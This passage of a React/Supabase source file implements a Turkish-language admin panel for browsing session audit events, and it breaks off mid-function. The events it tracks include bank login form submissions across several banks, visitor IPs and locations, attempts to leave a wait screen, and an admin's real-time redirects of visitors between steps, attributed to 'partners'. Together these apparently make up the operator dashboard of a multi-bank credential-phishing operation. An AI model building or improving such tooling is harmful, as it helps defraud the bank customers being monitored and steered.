"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type AuditEventRow = {
  id: number;
  created_at: string;
  session_id: string | null;
  public_id: string | null;
  partner_name: string | null;

  event_kind: string;
  event_action: string;
  status: string | null;

  user_ip: string | null;
  user_agent: string | null;
  country: string | null;
  city: string | null;
  referer_url: string | null;
  current_url: string | null;

  from_step: string | null;
  to_step: string | null;
  pathname: string | null;

  bank_slug: string | null;
  bank_name: string | null;
  login_method: string | null;

  admin_email: string | null;
  admin_action: string | null;

  meta: Record<string, any> | null;
  error_name: string | null;
  error_message: string | null;
};

const KIND_LABELS: Record<string, { tr: string; color: string }> = {
  presence:  { tr: "PRENS", color: "bg-sky-500/15 text-sky-300 ring-sky-400/30" },
  step:      { tr: "ADIM", color: "bg-violet-500/15 text-violet-300 ring-violet-400/30" },
  route:     { tr: "ROTA", color: "bg-indigo-500/15 text-indigo-300 ring-indigo-400/30" },
  submit:    { tr: "SUBMT", color: "bg-amber-500/15 text-amber-300 ring-amber-400/30" },
  auth:      { tr: "AUTH", color: "bg-emerald-500/15 text-emerald-300 ring-emerald-400/30" },
  bank_form: { tr: "BANKA", color: "bg-orange-500/15 text-orange-300 ring-orange-400/30" },
  api_call:  { tr: "API", color: "bg-cyan-500/15 text-cyan-300 ring-cyan-400/30" },
  storage:   { tr: "STORA", color: "bg-lime-500/15 text-lime-300 ring-lime-400/30" },
  system:    { tr: "SYS", color: "bg-fuchsia-500/15 text-fuchsia-300 ring-fuchsia-400/30" },
  error:     { tr: "HATA", color: "bg-red-500/15 text-red-300 ring-red-400/30" },
};

const STATUS_LABELS: Record<string, { tr: string; color: string }> = {
  ok:      { tr: "OK",       color: "bg-emerald-500/15 text-emerald-300 ring-emerald-400/30" },
  warn:    { tr: "UYARI",    color: "bg-amber-500/15 text-amber-300 ring-amber-400/30" },
  error:   { tr: "HATA",     color: "bg-red-500/15 text-red-300 ring-red-400/30" },
  blocked: { tr: "BLOKE",    color: "bg-rose-500/15 text-rose-300 ring-rose-400/30" },
};

const SELECT_FIELDS = [
  "id", "created_at", "session_id", "public_id", "partner_name",
  "event_kind", "event_action", "status",
  "user_ip", "user_agent", "country", "city", "referer_url", "current_url",
  "from_step", "to_step", "pathname",
  "bank_slug", "bank_name", "login_method",
  "admin_email", "admin_action",
  "meta", "error_name", "error_message",
].join(",");

const KIND_OPTIONS = [
  "Tümü", "presence", "step", "route", "submit", "auth", "bank_form", "api_call", "storage", "system", "error",
];
const STATUS_OPTIONS = ["Tümü", "ok", "warn", "error", "blocked"];

function toLocalTR(iso: string): string {
  try {
    const d = new Date(iso);
    return d.toLocaleString("tr-TR", {
      timeZone: "Europe/Istanbul",
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit", second: "2-digit",
    });
  } catch {
    return iso;
  }
}

function safeJsonStringify(v: unknown): string {
  try {
    return JSON.stringify(v, null, 2);
  } catch {
    return String(v);
  }
}

export function AuditLogsTab({ darkMode }: { darkMode: boolean; user?: any }) {
  const [rows, setRows] = useState<AuditEventRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [totalCount, setTotalCount] = useState<number | null>(null);

  const [filterKind, setFilterKind] = useState<string>("Tümü");
  const [filterStatus, setFilterStatus] = useState<string>("Tümü");
  const [filterAction, setFilterAction] = useState<string>("");
  const [filterSession, setFilterSession] = useState<string>("");
  const [filterIp, setFilterIp] = useState<string>("");
  const [filterBank, setFilterBank] = useState<string>("");
  const [filterPartner, setFilterPartner] = useState<string>("");
  const [fromDate, setFromDate] = useState<string>("");
  const [toDate, setToDate] = useState<string>("");
  const [limit, setLimit] = useState<number>(500);

  const [viewMode, setViewMode] = useState<"raw" | "summary">("raw");

  const [expandedId, setExpandedId] = useState<number | null>(null);
  const [backfillStatus, setBackfillStatus] = useState<null | { loading: boolean; msg: string; done?: any; error?: string }>(null);
  const supabaseRef = useRef<ReturnType<typeof createBrowserSupabaseClient> | null>(null);
  const reqRef = useRef<number>(0);
  const fetchLogsRef = useRef<() => Promise<void>>(async () => {});

  const fetchLogs = useCallback(async () => {
    const supabase = supabaseRef.current;
    if (!supabase) return;
    const myReq = ++reqRef.current;
    setLoading(true);
    try {
      let q = supabase.from("audit_event_logs").select(SELECT_FIELDS, { count: "exact" });

      if (filterKind !== "Tümü") q = q.eq("event_kind", filterKind);
      if (filterStatus !== "Tümü") q = q.eq("status", filterStatus);
      if (filterAction.trim()) q = q.ilike("event_action", `%${filterAction.trim()}%`);
      if (filterSession.trim()) {
        const s = filterSession.trim();
        q = q.or(`session_id.eq.${s},public_id.ilike.%${s}%`);
      }
      if (filterIp.trim()) q = q.ilike("user_ip", `%${filterIp.trim()}%`);
      if (filterBank.trim()) q = q.or(`bank_slug.ilike.%${filterBank.trim()}%,bank_name.ilike.%${filterBank.trim()}%`);
      if (filterPartner.trim()) q = q.ilike("partner_name", `%${filterPartner.trim()}%`);
      if (fromDate) q = q.gte("created_at", new Date(fromDate).toISOString());
      if (toDate) {
        const to = new Date(toDate);
        to.setDate(to.getDate() + 1);
        to.setHours(0, 0, 0, 0);
        q = q.lt("created_at", to.toISOString());
      }

      q = q.order("created_at", { ascending: false }).limit(limit);

      const { data, error, count } = await q;
      if (reqRef.current !== myReq) return;
      if (error) {
        setRows([]);
        setTotalCount(null);
      } else {
        setRows((data ?? []) as unknown as AuditEventRow[]);
        setTotalCount(typeof count === "number" ? count : null);
      }
    } finally {
      if (reqRef.current === myReq) setLoading(false);
    }
  }, [filterKind, filterStatus, filterAction, filterSession, filterIp, filterBank, filterPartner, fromDate, toDate, limit]);

  useEffect(() => { fetchLogsRef.current = fetchLogs; }, [fetchLogs]);

  const runBackfill = useCallback(async (dryRun: boolean) => {
    setBackfillStatus({ loading: true, msg: dryRun ? "Deneme (dry-run) yapılıyor..." : "Eski sessionlar dolduruluyor..." });
    try {
      const res = await fetch("/api/admin/backfill-audit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "same-origin",
        body: JSON.stringify({ dryRun, limit: 5000 }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data.error) {
        setBackfillStatus({ loading: false, msg: "Hata oluştu", error: data?.error || `${res.status}` });
      } else {
        setBackfillStatus({ loading: false, msg: dryRun ? "Deneme tamamlandı (hiçbir şey yazılmadı)" : "Tamamlandı!", done: data });
        if (!dryRun) setTimeout(() => void fetchLogsRef.current(), 600);
      }
    } catch (e: any) {
      setBackfillStatus({ loading: false, msg: "Bağlantı hatası", error: e?.message || String(e) });
    }
  }, []);

  useEffect(() => {
    supabaseRef.current = createBrowserSupabaseClient();
  }, []);

  useEffect(() => {
    void fetchLogs();
  }, [fetchLogs]);

  useEffect(() => {
    const sb = supabaseRef.current;
    if (!sb) return;
    const channel = sb.channel("audit_event_logs_watch")
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "audit_event_logs" },
        () => { void fetchLogs(); },
      )
      .subscribe();
    return () => { void sb.removeChannel(channel); };
  }, [fetchLogs]);

  const stats = useMemo(() => {
    const s = { total: rows.length, ok: 0, warn: 0, error: 0, blocked: 0, uniqueSessions: new Set<string>() };
    for (const r of rows) {
      if (r.status === "ok") s.ok++;
      else if (r.status === "warn") s.warn++;
      else if (r.status === "error") s.error++;
      else if (r.status === "blocked") s.blocked++;
      if (r.session_id) s.uniqueSessions.add(r.session_id);
    }
    return { ...s, uniqueSessions: s.uniqueSessions.size };
  }, [rows]);

  const card = darkMode
    ? "bg-[#1c1c1e]/60 border-white/5"
    : "bg-white/60 border-[#d2d2d7]/50";
  const chipBase = "inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-[11px] font-semibold tracking-wide ring-1 ring-inset";
  const muted = darkMode ? "text-white/50" : "text-black/50";
  const inputBase = `w-full rounded-xl border outline-none px-3 py-2 text-sm font-medium transition-all focus:ring-2 focus:ring-[#EB5E28]/50 ${darkMode ? "bg-black/50 border-white/10 text-white placeholder:text-white/30" : "bg-gray-50/50 border-gray-200 text-black placeholder:text-black/40"}`;

  return (
    <div className="space-y-6">
      {/* Header + Summary */}
      <div className="flex flex-wrap items-start justify-between gap-4">
        <div>
          <h2 className="text-2xl font-semibold tracking-tight">Audit Olayları</h2>
          <p className={`mt-1 text-sm ${muted}`}>Tüm oturum, adım, submit, presence ve yönlendirme olayları kalıcı burada. Sola tıkla detayı gör.</p>
        </div>
        <div className="grid grid-cols-2 gap-2 sm:grid-cols-5 min-w-[360px] max-w-full">
          <StatCard label="Toplam" value={stats.total.toString()} accent="bg-[#EB5E28]/15 text-[#ff8a5c] ring-[#EB5E28]/30" darkMode={darkMode} />
          <StatCard label="OK"     value={stats.ok.toString()}    accent={STATUS_LABELS.ok.color} darkMode={darkMode} />
          <StatCard label="Uyarı" value={stats.warn.toString()}  accent={STATUS_LABELS.warn.color} darkMode={darkMode} />
          <StatCard label="Hata" value={stats.error.toString()}  accent={STATUS_LABELS.error.color} darkMode={darkMode} />
          <StatCard label="Oturum" value={stats.uniqueSessions.toString()} accent={KIND_LABELS.presence.color} darkMode={darkMode} />
        </div>
      </div>

      {/* Backfill Yardımcı Kutusu — Eski session'ları doldurmak için */}
      <div className={`rounded-3xl border backdrop-blur-2xl p-4 shadow-sm flex flex-wrap items-start gap-4 justify-between ${card}`}>
        <div className="min-w-[280px] flex-1">
          <div className="flex items-center gap-2">
            <span className="inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-[11px] font-bold ring-1 ring-inset bg-[#EB5E28]/15 text-[#ff8a5c] ring-[#EB5E28]/30">ÖNEMLİ</span>
            <div className="font-bold">Eski session'lar şu anda Eski Loglar'da görünmüyor mu?</div>
          </div>
          <div className={`mt-1 text-xs ${muted}`}>
            Audit sistemi kurulmadan önce oluşturulmuş session'lar (eski kayıtlar) <b>otomatik olarak yüklü değil</b>. Onları tek seferde audit tablosuna aktarmak için aşağıdaki butonu kullan.
          </div>
        </div>
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={() => void runBackfill(true)}
            disabled={!!backfillStatus?.loading}
            className="inline-flex items-center gap-2 rounded-full px-3.5 py-2 text-sm font-semibold transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed "
            style={{
              background: darkMode ? "rgba(255,255,255,0.08)" : "rgba(0,0,0,0.05)",
              color: darkMode ? "rgba(255,255,255,0.92)" : "rgba(0,0,0,0.9)",
            }}
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
            Önce Deneme (Dry Run)
          </button>
          <button
            onClick={() => void runBackfill(false)}
            disabled={!!backfillStatus?.loading}
            className="inline-flex items-center gap-2 rounded-full bg-[#EB5E28] px-4 py-2 text-sm font-semibold text-white shadow-lg shadow-[#EB5E28]/30 hover:shadow-[#EB5E28]/50 transition-all hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {backfillStatus?.loading ? (
              <svg className="w-4 h-4 animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h5M20 20v-5h-5M5.5 18.5A8 8 0 0018 11M18.5 5.5A8 8 0 006 13" /></svg>
            ) : (
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" /></svg>
            )}
            {backfillStatus?.loading ? backfillStatus.msg : "Eski Session'ları Doldur"}
          </button>
        </div>
      </div>
      {backfillStatus && (
        <div className={`rounded-2xl border backdrop-blur-2xl px-4 py-3 text-sm flex flex-wrap items-start gap-3 justify-between ${backfillStatus.error ? "border-red-500/30 bg-red-500/5" : backfillStatus.done ? "border-emerald-500/30 bg-emerald-500/5" : "border-[#EB5E28]/30 bg-[#EB5E28]/5"}`}>
          <div className="min-w-[240px] flex-1">
            <div className="font-semibold">{backfillStatus.msg}</div>
            {backfillStatus.done && (
              <div className={`mt-1 text-xs ${muted}`}>
                Yazılan: <b>{backfillStatus.done.inserted ?? 0}</b> · Uygun session: {backfillStatus.done.sessionsProcessed ?? 0} · Beklenen: {backfillStatus.done.expected ?? 0}
                {backfillStatus.done.dryRun ? ` · Yazılı sample: ${JSON.stringify((backfillStatus.done.sample ?? []).length)} adet` : ""}
                {backfillStatus.done.hadPartialFail ? ` · Kısmi hata: ${backfillStatus.done.firstError ?? ""}` : ""}
              </div>
            )}
            {backfillStatus.error && <div className={`mt-1 text-xs ${darkMode ? "text-red-400" : "text-red-700"}`}>Hata: {backfillStatus.error}</div>}
          </div>
          <button onClick={() => setBackfillStatus(null)} className={`rounded-full px-3 py-1 text-xs font-semibold ${darkMode ? "bg-white/10 hover:bg-white/20" : "bg-black/5 hover:bg-black/10"}`}>Kapat</button>
        </div>
      )}

      {/* Filters */}
      <div className={`rounded-3xl border backdrop-blur-2xl p-5 shadow-sm ${card}`}>
        <div className="grid grid-cols-1 gap-3 md:grid-cols-3 lg:grid-cols-4">
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Olay Türü</label>
            <select className={inputBase} value={filterKind} onChange={(e) => setFilterKind(e.target.value)}>
              {KIND_OPTIONS.map((k) => (
                <option key={k} value={k}>{k === "Tümü" ? k : (KIND_LABELS[k]?.tr ? `${KIND_LABELS[k].tr} · ${k}` : k)}</option>
              ))}
            </select>
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Sonuç</label>
            <select className={inputBase} value={filterStatus} onChange={(e) => setFilterStatus(e.target.value)}>
              {STATUS_OPTIONS.map((k) => (
                <option key={k} value={k}>{k === "Tümü" ? k : (STATUS_LABELS[k]?.tr ? `${STATUS_LABELS[k].tr} · ${k}` : k)}</option>
              ))}
            </select>
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Aksiyon Ara</label>
            <input className={inputBase} placeholder="örn: wait_back_attempt" value={filterAction} onChange={(e) => setFilterAction(e.target.value)} />
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Session (UUID veya Public)</label>
            <input className={inputBase} placeholder="Session ID veya public_id" value={filterSession} onChange={(e) => setFilterSession(e.target.value)} />
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>IP</label>
            <input className={inputBase} placeholder="örn 192.168.1.1" value={filterIp} onChange={(e) => setFilterIp(e.target.value)} />
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Banka (slug veya isim)</label>
            <input className={inputBase} placeholder="örn unity-bank" value={filterBank} onChange={(e) => setFilterBank(e.target.value)} />
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Partner / Oluşturan</label>
            <input className={inputBase} placeholder="örn admin" value={filterPartner} onChange={(e) => setFilterPartner(e.target.value)} />
          </div>
          <div>
            <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Tarih Aralığı</label>
            <div className="flex gap-2">
              <input type="date" className={inputBase} value={fromDate} onChange={(e) => setFromDate(e.target.value)} />
              <input type="date" className={inputBase} value={toDate} onChange={(e) => setToDate(e.target.value)} />
            </div>
          </div>
          <div className="md:col-span-3 lg:col-span-4 flex flex-wrap items-center gap-3 pt-1">
            <div>
              <label className={`mb-1 block text-xs font-semibold uppercase tracking-wider ${muted}`}>Son N tane</label>
              <select className={inputBase + " max-w-[160px]"} value={limit} onChange={(e) => setLimit(Number(e.target.value))}>
                <option value={100}>100</option>
                <option value={250}>250</option>
                <option value={500}>500</option>
                <option value={1000}>1.000</option>
                <option value={2500}>2.500</option>
                <option value={5000}>5.000</option>
              </select>
            </div>
            <button
              onClick={() => void fetchLogs()}
              className="mt-5 inline-flex items-center gap-2 rounded-full bg-[#EB5E28] px-4 py-2 text-sm font-semibold text-white shadow-lg shadow-[#EB5E28]/30 hover:shadow-[#EB5E28]/50 transition-all hover:scale-[1.02] active:scale-95"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h5M20 20v-5h-5M5.5 18.5A8 8 0 0018 11M18.5 5.5A8 8 0 006 13" /></svg>
              Yenile
            </button>
            <button
              onClick={() => {
                setFilterKind("Tümü"); setFilterStatus("Tümü"); setFilterAction(""); setFilterSession("");
                setFilterIp(""); setFilterBank(""); setFilterPartner(""); setFromDate(""); setToDate(""); setLimit(500);
              }}
              className={`mt-5 rounded-full px-4 py-2 text-sm font-semibold transition-all hover:scale-[1.02] active:scale-95 ${darkMode ? "bg-white/10 hover:bg-white/20 text-white/90" : "bg-black/5 hover:bg-black/10 text-black/90"}`}
            >
              Filtreleri Sıfırla
            </button>
            {totalCount !== null && (
              <span className={`mt-5 text-xs font-medium ${muted}`}>
                Toplam eşleşen: {totalCount} kayıt
              </span>
            )}
          </div>
        </div>
      </div>

      {/* View Switch */}
      <div className={`rounded-3xl border backdrop-blur-2xl p-3 shadow-sm w-full max-w-[480px] ${card} grid grid-cols-2 gap-2`}>
        <button
          onClick={() => setViewMode("summary")}
          className={`rounded-2xl py-2 px-4 text-sm font-bold transition-all ${viewMode === "summary" ? "bg-[#EB5E28] text-white shadow-lg shadow-[#EB5E28]/30" : darkMode ? "hover:bg-white/10 text-white/80" : "hover:bg-black/5 text-black/80"}`}
        >
          📊 Session Özet — Yönlendirme + Sayaçlar
        </button>
        <button
          onClick={() => setViewMode("raw")}
          className={`rounded-2xl py-2 px-4 text-sm font-bold transition-all ${viewMode === "raw" ? "bg-[#EB5E28] text-white shadow-lg shadow-[#EB5E28]/30" : darkMode ? "hover:bg-white/10 text-white/80" : "hover:bg-black/5 text-black/80"}`}
        >
          🧾 Ham Veriler (Her Log Satırı)
        </button>
      </div>

      {/* Session Özet Görünümü */}
      {viewMode === "summary" && (
        <AuditSummaryView rows={rows} loading={loading} darkMode={darkMode} />
      )}

      {/* Ham Tablosu — sadece raw görünümde */}
      {viewMode === "raw" && (
        <RawAuditTableView
          rows={rows}
          loading={loading}
          darkMode={darkMode}
          expandedId={expandedId}
          setExpandedId={setExpandedId}
        />
      )}
    </div>
  );
}

function StatCard({ label, value, accent, darkMode }: { label: string; value: string; accent: string; darkMode: boolean }) {
  return (
    <div className={`rounded-2xl border backdrop-blur-2xl p-3 shadow-sm ${darkMode ? "bg-[#1c1c1e]/60 border-white/5" : "bg-white/60 border-[#d2d2d7]/50"}`}>
      <div className={`inline-flex rounded-full px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider ring-1 ring-inset ${accent}`}>{label}</div>
      <div className="mt-2 text-2xl font-extrabold tracking-tight">{value}</div>
    </div>
  );
}

function FragmentLike(props: { children: React.ReactNode; key?: string | number }) {
  return (
    <>{props.children}</>
  );
}

/* ---------------- Ham Tablosu ---------------- */
function RawAuditTableView({
  rows, loading, darkMode, expandedId, setExpandedId,
}: {
  rows: AuditEventRow[];
  loading: boolean;
  darkMode: boolean;
  expandedId: number | null;
  setExpandedId: (v: number | null) => void;
}) {
  const card = darkMode
    ? "bg-[#1c1c1e]/60 border-white/5"
    : "bg-white/60 border-[#d2d2d7]/50";
  const chipBase = "inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-[11px] font-semibold tracking-wide ring-1 ring-inset";
  const muted = darkMode ? "text-white/50" : "text-black/50";

  return (
    <div className={`rounded-3xl border backdrop-blur-2xl overflow-hidden shadow-sm ${card}`}>
      <div className="overflow-x-auto">
        <table className="w-full min-w-[1280px] text-sm">
          <thead>
            <tr className={`border-b text-left text-xs font-bold uppercase tracking-wider ${darkMode ? "border-white/5 text-white/50" : "border-[#d2d2d7]/50 text-black/50"}`}>
              <th className="px-4 py-3 w-[150px]">Tarih (TR)</th>
              <th className="px-3 py-3 w-[78px]">Tür</th>
              <th className="px-3 py-3 w-[70px]">Durum</th>
              <th className="px-3 py-3 w-[190px]">Aksiyon</th>
              <th className="px-3 py-3">Session ID / Public</th>
              <th className="px-3 py-3">Partner</th>
              <th className="px-3 py-3 w-[120px]">IP</th>
              <th className="px-3 py-3 w-[150px]">Banka</th>
              <th className="px-3 py-3 w-[230px]">From → To Step</th>
              <th className="px-3 py-3">Referer / URL</th>
              <th className="px-3 py-3 w-[60px]"></th>
            </tr>
          </thead>
          <tbody className="divide-y divide-white/5">
            {loading && rows.length === 0 && (
              <tr><td colSpan={11} className="px-5 py-16 text-center">
                <div className="flex items-center justify-center">
                  <div className="size-10 animate-spin rounded-full border-4 border-[#EB5E28]/30 border-t-[#EB5E28]" />
                </div>
              </td></tr>
            )}
            {!loading && rows.length === 0 && (
              <tr><td colSpan={11} className={`px-5 py-16 text-center ${muted}`}>
                Henüz audit logu yok. İlk olay oluşturulduğunda burada görünecek.
              </td></tr>
            )}
            {rows.map((r) => {
              const kindLabel = KIND_LABELS[r.event_kind] ?? { tr: r.event_kind.toUpperCase().slice(0, 5), color: "bg-white/10 text-white/70 ring-white/10" };
              const statusLabel = STATUS_LABELS[r.status ?? "ok"] ?? STATUS_LABELS.ok;
              const isExpanded = expandedId === r.id;
              return (
                <FragmentLike key={r.id}>
                  <tr
                    onClick={() => setExpandedId(isExpanded ? null : r.id)}
                    className={`cursor-pointer transition-colors ${darkMode ? "hover:bg-white/5" : "hover:bg-black/5"}`}
                  >
                    <td className="px-4 py-3 align-top font-mono text-[11px] whitespace-nowrap">{toLocalTR(r.created_at)}</td>
                    <td className="px-3 py-3 align-top">
                      <span className={chipBase + " " + kindLabel.color}>{kindLabel.tr}</span>
                    </td>
                    <td className="px-3 py-3 align-top">
                      <span className={chipBase + " " + statusLabel.color}>{statusLabel.tr}</span>
                    </td>
                    <td className="px-3 py-3 align-top">
                      <div className="font-mono text-[11px] font-semibold break-all">{r.event_action}</div>
                      {r.pathname && <div className={`text-[10px] ${muted} truncate`}>{r.pathname}</div>}
                    </td>
                    <td className="px-3 py-3 align-top">
                      {r.session_id ? <div className="font-mono text-[10px] opacity-90 max-w-[200px] truncate" title={r.session_id}>{r.session_id}</div> : <span className={muted}>-</span>}
                      {r.public_id ? <div className={`font-mono text-[10px] ${muted} max-w-[200px] truncate mt-0.5`} title={r.public_id}>pub: {r.public_id}</div> : null}
                    </td>
                    <td className="px-3 py-3 align-top text-[12px]">{r.partner_name ?? <span className={muted}>-</span>}</td>
                    <td className="px-3 py-3 align-top">
                      {r.user_ip ? (
                        <div>
                          <div className="font-mono text-[11px]">{r.user_ip}</div>
                          {r.country ? <div className={`text-[10px] ${muted}`}>{r.country}{r.city ? ` · ${r.city}` : ""}</div> : null}
                        </div>
                      ) : <span className={muted}>-</span>}
                    </td>
                    <td className="px-3 py-3 align-top">
                      {r.bank_name || r.bank_slug ? (
                        <div>
                          <div className="text-[12px] font-semibold truncate max-w-[160px]" title={r.bank_name ?? ""}>{r.bank_name ?? "-"}</div>
                          {r.bank_slug && r.bank_slug !== r.bank_name && <div className={`font-mono text-[10px] ${muted} truncate`}>{r.bank_slug}</div>}
                          {r.login_method && <div className={`text-[10px] ${muted}`}>Yöntem: {r.login_method}</div>}
                        </div>
                      ) : <span className={muted}>-</span>}
                    </td>
                    <td className="px-3 py-3 align-top">
                      {(r.from_step || r.to_step) ? (
                        <div className="flex flex-wrap items-center gap-1">
                          <span className={`px-2 py-0.5 rounded-md text-[10px] font-semibold ${darkMode ? "bg-white/10" : "bg-black/5"}`}>{r.from_step ?? "—"}</span>
                          <svg className="w-3 h-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" /></svg>
                          <span className="px-2 py-0.5 rounded-md text-[10px] font-bold bg-[#EB5E28]/15 text-[#ff8a5c] ring-1 ring-inset ring-[#EB5E28]/30">{r.to_step ?? "—"}</span>
                        </div>
                      ) : <span className={muted}>-</span>}
                    </td>
                    <td className="px-3 py-3 align-top">
                      {r.referer_url ? <div className={`font-mono text-[10px] ${muted} truncate max-w-[200px]`} title={r.referer_url}>REF: {r.referer_url}</div> : null}
                      {r.current_url ? <div className="font-mono text-[10px] truncate max-w-[200px] mt-0.5" title={r.current_url}>{r.current_url}</div> : <span className={muted}>-</span>}
                    </td>
                    <td className="px-3 py-3 align-top text-right">
                      <span className={`inline-flex h-7 w-7 items-center justify-center rounded-full transition ${darkMode ? "bg-white/5 hover:bg-white/10" : "bg-black/5 hover:bg-black/10"}`}>
                        <svg className={`w-4 h-4 transition-transform ${isExpanded ? "rotate-180" : ""}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                      </span>
                    </td>
                  </tr>
                  {isExpanded && (
                    <tr className={`${darkMode ? "bg-white/[0.03]" : "bg-black/[0.03]"}`}>
                      <td colSpan={11} className="px-5 py-5">
                        <ExpandedAuditRow row={r} darkMode={darkMode} />
                      </td>
                    </tr>
                  )}
                </FragmentLike>
              );
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}

/* ---------------- Session Özet Sayaçlar + Yönlendirmeler ---------------- */
type SessionSummary = {
  session_id: string;
  public_id: string | null;
  partner_name: string | null;
  first_seen: string;
  last_seen: string;
  ips: string[];
  countries: string[];
  user_agents: string[];
  banks: string[];

  total_events: number;
  presence_pulse_count: number;     // sayfa açık kaldıkça heartbeat
  presence_subscribe_count: number;
  session_mount_count: number;
  pagehide_count: number;           // sekme kapatma
  tab_hidden_count: number;         // arka plana atma
  wait_back_attempts: number;       // beklemeden geri butonu denemeleri
  wait_mounts: number;
  bank_submit_count: number;        // submit tıklaması (bank_submit_wait + nz_exact)
  bank_submit_error_count: number;
  server_redirect_count: number;    // server step senkronundan yönlendirme
  admin_redirect_count: number;     // admin realtime yönlendirme sayısı
  last_redirect_from: string | null;
  last_redirect_to: string | null;   // KULLANICININ İHTİYACI OLAN -> SON NEREYE YÖNLENDİRİLDİ
  last_redirect_at: string | null;
  redirect_log: { when: string; from: string | null; to: string | null; action: string }[];

  errors_count: number;
  blocked_count: number;
};

function buildSummary(rows: AuditEventRow[]): SessionSummary[] {
  const map = new Map<string, SessionSummary>();
  for (const r of rows) {
    const sid = r.session_id;
    if (!sid) continue;
    if (!map.has(sid)) {
      map.set(sid, {
        session_id: sid,
        public_id: r.public_id ?? null,
        partner_name: r.partner_name ?? null,
        first_seen: r.created_at,
        last_seen: r.created_at,
        ips: [],
        countries: [],
        user_agents: [],
        banks: [],
        total_events: 0,
        presence_pulse_count: 0,
        presence_subscribe_count: 0,
        session_mount_count: 0,
        pagehide_count: 0,
        tab_hidden_count: 0,
        wait_back_attempts: 0,
        wait_mounts: 0,
        bank_submit_count: 0,
        bank_submit_error_count: 0,
        server_redirect_count: 0,
        admin_redirect_count: 0,
        last_redirect_from: null,
        last_redirect_to: null,
        last_redirect_at: null,
        redirect_log: [],
        errors_count: 0,
        blocked_count: 0,
      });
    }
    const s = map.get(sid)!;
    s.total_events++;
    if (r.created_at < s.first_seen) s.first_seen = r.created_at;
    if (r.created_at > s.last_seen) s.last_seen = r.created_at;
    if (r.public_id) s.public_id = r.public_id;
    if (r.partner_name) s.partner_name = r.partner_name;
    if (r.user_ip && !s.ips.includes(r.user_ip)) s.ips.push(r.user_ip);
    if (r.country && !s.countries.includes(r.country)) s.countries.push(r.country);
    if (r.user_agent && !s.user_agents.includes(r.user_agent)) s.user_agents.push(r.user_agent);
    const bankLabel = (r.bank_name && r.bank_slug)
      ? `${r.bank_name} (${r.bank_slug})`
      : (r.bank_name || r.bank_slug);
    if (bankLabel && !s.banks.includes(bankLabel)) s.banks.push(bankLabel);

    // Sayaçlar
    if (r.event_kind === "presence" && r.event_action === "presence_pulse") s.presence_pulse_count++;
    if (r.event_kind === "presence" && r.event_action === "presence_subscribe") s.presence_subscribe_count++;
    if (r.event_kind === "presence" && r.event_action === "session_mount") s.session_mount_count++;
    if (r.event_kind === "presence" && r.event_action === "pagehide") s.pagehide_count++;
    if (r.event_kind === "presence" && r.event_action === "presence_hidden") s.tab_hidden_count++;
    if (r.event_kind === "presence" && r.event_action === "session_mark_offline") s.pagehide_count++;

    if (r.event_kind === "step" && r.event_action === "wait_mount") s.wait_mounts++;
    if (r.event_kind === "step" && r.event_action === "wait_back_attempt") s.wait_back_attempts++;

    if (r.event_kind === "bank_form" && r.event_action === "bank_submit_wait") s.bank_submit_count++;
    if (r.event_kind === "bank_form" && r.event_action === "nz_exact_submit_wait") s.bank_submit_count++;
    if (r.event_kind === "submit" && r.event_action === "bank_submit_error") s.bank_submit_error_count++;
    if (r.event_kind === "submit" && r.event_action === "nz_exact_submit_error") s.bank_submit_error_count++;

    // Yönlendirmeler
    let isRedirect = false;
    if (r.event_kind === "step" && r.event_action === "server_step_redirect") {
      s.server_redirect_count++; isRedirect = true;
    }
    if (r.event_kind === "step" && r.event_action === "admin_realtime_redirect") {
      s.admin_redirect_count++; isRedirect = true;
    }
    if (isRedirect && (r.from_step || r.to_step)) {
      if (!s.last_redirect_at || r.created_at >= s.last_redirect_at) {
        s.last_redirect_at = r.created_at;
        s.last_redirect_from = r.from_step ?? null;
        s.last_redirect_to = r.to_step ?? null;
      }
      s.redirect_log.unshift({
        when: r.created_at,
        from: r.from_step ?? null,
        to: r.to_step ?? null,
        action: r.event_action,
      });
